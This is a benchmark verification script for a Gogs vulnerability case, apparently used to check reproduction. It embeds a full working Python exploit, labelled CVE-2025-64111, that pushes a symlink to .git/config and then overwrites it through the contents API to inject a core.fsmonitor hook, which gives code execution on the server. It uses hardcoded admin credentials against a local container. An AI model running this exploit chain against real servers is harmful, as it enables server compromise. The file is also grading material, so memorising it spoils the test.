#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PCB_CASE_DIR="$CASE_DIR"
# compose services are v0/v1/v2; Gogs listens on 3000 (case.yaml exposed_ports).
SVC="$VERSION"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
# Keep the start-time planted canary. Never export the submitted RUN_FLAG into
# compose — `up` would recreate the container and fail the wrong/stale gates.
export PCB_FLAG="${PCB_PLANTED_FLAG:-${PCB_FLAG:-$RUN_FLAG}}"
case "$VERSION" in
  v0) PORT="${PORT_V0_0:-}" ;;
  v1) PORT="${PORT_V1_0:-}" ;;
  *) PORT="${PORT_V2_0:-}" ;;
esac
CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-3000}"
if [[ -z "$PORT" ]]; then
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
fi
CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" ps -q "$SVC" 2>/dev/null | head -1)"
if [[ -z "$CID" ]]; then
  CID="$(docker ps -q --filter "name=${COMPOSE_PROJECT_NAME}-${SVC}-" | head -1)"
fi
need_up=0
if [[ -z "$CID" ]]; then
  need_up=1
else
  estate="$(docker inspect -f '{{.State.Status}}' "$CID" 2>/dev/null || echo missing)"
  if [[ "$estate" != "running" ]]; then need_up=1; fi
fi
if [[ "$need_up" == "1" ]]; then
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" up -d --pull never >/dev/null 2>&1 || true
fi
ok_http=0
for _ in $(seq 1 45); do
  if [[ -z "$PORT" ]]; then
    PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
  fi
  if [[ -n "$PORT" ]]; then
    code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 "http://127.0.0.1:${PORT}/" || true)"
    if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" || "$code" == "303" ]]; then
      ok_http=1
      break
    fi
  fi
  sleep 2
done
if [[ "$ok_http" != "1" ]]; then
  echo "verify: gogs $SVC HTTP not ready (host=$PORT)" >&2
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" ps -a >&2 || true
  exit 20
fi
lcode="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/user/login" || true)"
if [[ "$lcode" != "200" ]]; then
  python3 "$CASE_DIR/scripts/init_gogs.py" "$PORT" >/dev/null 2>&1 || true
fi
export PCB_TARGET_PORT="${PORT:-}"
CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" ps -q "$SVC" 2>/dev/null | head -1)"
if [[ -z "$CID" ]]; then
  CID="$(docker ps -q --filter "name=${COMPOSE_PROJECT_NAME}-${SVC}-" | head -1)"
fi
export PCB_CONTAINER_ID="${CID:-}"
[[ -n "$CID" ]] || { echo "verify: no container for $SVC after up" >&2; exit 20; }
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual: CVE-2025-64111 — API PUT /api/v1/repos/{owner}/{repo}/contents/{path} 调用
  # UpdateRepoFile(IsNewFile=false, OldTreeName==NewTreeName) 纯更新路径，V1 (0.13.3) 的
  # IsSymlink 检查只覆盖 IsNewFile/move 路径，更新路径无检查：os.WriteFile 沿已 push 的
  # 文件 symlink (link -> .git/config) 覆写 git 配置，注入 core.fsmonitor 读取 planted flag
  # （/data/pcb/flag.txt -> /tmp/pcb_result.txt）。V2 (0.13.4) 补上检查。
  # 注：poc/seed_exec.py 依赖 poc/gogs_util.py 与 poc/X/X_poc.py（本 case 未打包这些文件），
  # seed 分支因此 rc=20；residual 无法经 seed_exec 派发，内联完整流程（与 heldout 语义一致）。
  CAND='{"probe_id": "cve-2025-64111-residual", "type": "api_put"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  CID="${PCB_CONTAINER_ID:-}"
  if [[ -z "$CID" ]]; then
    CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" ps -q "$SVC" 2>/dev/null | head -1)"
  fi
  if [[ -z "$CID" ]]; then
    CID="$(docker ps -q --filter "name=${COMPOSE_PROJECT_NAME}-${SVC}-" | head -1)"
  fi
  [[ -n "$CID" ]] || { echo "residual: no container for $SVC" >&2; exit 20; }
  PORT="${PCB_TARGET_PORT:-}"
  if [[ -z "$PORT" ]]; then
    # case.yaml exposed_ports(80) 与本 case 真实容器端口(3000)不一致，PORT 发现失败时
    # 从 compose 有效配置恢复：取 $SVC 首个发布映射的容器端口再查宿主端口。
    TARGET="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --format json 2>/dev/null | "$PY" -c "import json,sys
d=json.load(sys.stdin)
for p in (d.get('services', {}).get('$SVC', {}) or {}).get('ports') or []:
    if isinstance(p, dict) and p.get('published') is not None:
        print(p.get('target')); break
")"
    PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" "$TARGET" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  fi
  [[ -n "$PORT" ]] || { echo "residual: no target port" >&2; exit 20; }
  OUT="$("$PY" - "$CAND" "$PORT" "$COMPOSE_PROJECT_NAME" "$CASE_DIR" "$CID" <<'PYEOF'
import base64, json, os, re, subprocess, sys, tempfile, time
import requests

cand = json.loads(sys.argv[1])
port, project, case_dir, cid = sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
base = f"http://127.0.0.1:{port}"
USER, PASS, REPO = "pcbadmin", "Admin12345!", "testrepo"


def _csrf(html):
    m = re.search(r'name="_csrf"\s+(?:content|value)="([^"]+)"', html) or re.search(r'_csrf.*?content="([^"]+)"', html)
    return m.group(1) if m else ""


def _git(*args, cwd=None, env=None):
    e = dict(os.environ)
    e.update(env or {})
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, timeout=90, env=e)


def wait_ready(timeout=180):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            r = requests.get(base + "/", timeout=3)
            if r.status_code < 500:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def install():
    try:
        s = requests.Session()
        r = s.get(base + "/install", timeout=10)
        data = {
            "db_type": "SQLite3", "db_path": "/data/gogs/gogs.db",
            "app_name": "Gogs", "repo_root_path": "/data/git/gogs-repositories",
            "run_user": "git", "domain": "localhost", "ssh_port": "22",
            "http_port": "3000", "app_url": "http://localhost:3000/",
            "log_root_path": "/data/gogs/log", "smtp_host": "",
            "admin_name": USER, "admin_passwd": PASS,
            "admin_confirm_passwd": PASS, "admin_email": "admin@pcb.local",
        }
        tok = _csrf(r.text)
        if tok:
            data["_csrf"] = tok
        r = s.post(base + "/install", data=data, timeout=30, allow_redirects=False)
        return r.status_code in (200, 302, 303)
    except Exception:
        return False


def make_token():
    try:
        r = requests.post(f"{base}/api/v1/users/{USER}/tokens", auth=(USER, PASS),
                          json={"name": f"pcb_{int(time.time())}"}, timeout=10)
        if r.status_code == 201:
            return r.json().get("sha1", "")
    except Exception:
        pass
    return ""


def repo_exists(tok):
    try:
        r = requests.get(f"{base}/api/v1/repos/{USER}/{REPO}",
                         headers={"Authorization": f"token {tok}"}, timeout=10)
        return r.status_code == 200
    except Exception:
        return False


def create_repo(tok):
    h = {"Authorization": f"token {tok}"}
    try:
        r = requests.post(f"{base}/api/v1/user/repos", headers=h,
                          json={"name": REPO, "auto_init": False}, timeout=15)
        if r.status_code not in (200, 201):
            return False
    except Exception:
        return False
    env = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
    with tempfile.TemporaryDirectory() as td:
        d = os.path.join(td, REPO)
        os.makedirs(d)
        if _git("init", cwd=d).returncode != 0 or _git("checkout", "-b", "master", cwd=d).returncode != 0:
            return False
        with open(os.path.join(d, "README.md"), "w") as f:
            f.write("# test repo\n")
        if _git("add", ".", cwd=d).returncode != 0:
            return False
        if _git("commit", "-m", "init", cwd=d, env=env).returncode != 0:
            return False
        url = f"http://{USER}:{PASS}@127.0.0.1:{port}/{USER}/{REPO}.git"
        if _git("remote", "add", "origin", url, cwd=d).returncode != 0:
            return False
        return _git("push", "-u", "origin", "master", cwd=d, env=env).returncode == 0


def push_symlink():
    url = f"http://{USER}:{PASS}@127.0.0.1:{port}/{USER}/{REPO}.git"
    env = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
    with tempfile.TemporaryDirectory() as td:
        d = os.path.join(td, REPO)
        r = subprocess.run(["git", "clone", url, d], capture_output=True, text=True, timeout=90,
                           env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
        if r.returncode != 0:
            return False
        os.symlink(".git/config", os.path.join(d, "link"))
        if _git("add", "link", cwd=d).returncode != 0:
            return False
        if _git("commit", "-m", "add link", cwd=d, env=env).returncode != 0:
            return False
        return _git("push", "origin", "master", cwd=d, env=env).returncode == 0


def malicious_config():
    return (
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tfsmonitor = /data/pcb/fsmon.sh\n"
        "[remote \"origin\"]\n"
        f"\turl = /data/git/gogs-repositories/{USER}/{REPO}.git\n"
        "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
        "[branch \"master\"]\n"
        "\tremote = origin\n"
        "\tmerge = refs/heads/master\n"
    )


def read_flag():
    try:
        r = subprocess.run(["docker", "exec", cid, "cat", "/tmp/pcb_result.txt"],
                           capture_output=True, text=True, timeout=15)
        return r.stdout.strip()
    except Exception:
        return ""


def clear_flag():
    subprocess.run(["docker", "exec", cid, "rm", "-f", "/tmp/pcb_result.txt"],
                   capture_output=True, timeout=10)


try:
    if not wait_ready():
        print(json.dumps({"body": "", "error": "gogs not ready"})); sys.exit(0)
    install()
    time.sleep(2)
    tok = make_token()
    if not tok:
        print(json.dumps({"body": "", "error": "token creation failed"})); sys.exit(0)
    if not repo_exists(tok):
        if not create_repo(tok) or not push_symlink():
            print(json.dumps({"body": "", "error": "repo/symlink setup failed"})); sys.exit(0)
    time.sleep(1)
    clear_flag()
    h = {"Authorization": f"token {tok}"}
    r = requests.get(f"{base}/api/v1/repos/{USER}/{REPO}/contents/link", headers=h, timeout=10)
    if r.status_code != 200:
        print(json.dumps({"body": "", "error": f"get_contents_failed:{r.status_code}"})); sys.exit(0)
    sha = r.json().get("sha", "")
    payload = {
        "content": base64.b64encode(malicious_config().encode()).decode(),
        "message": "update link", "sha": sha,
    }
    requests.put(f"{base}/api/v1/repos/{USER}/{REPO}/contents/link",
                 headers=h, json=payload, timeout=30)
    time.sleep(3)
    flag = read_flag()
    print(json.dumps({"status": "done", "body": flag}))
except Exception as e:
    print(json.dumps({"body": "", "error": str(e)}))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
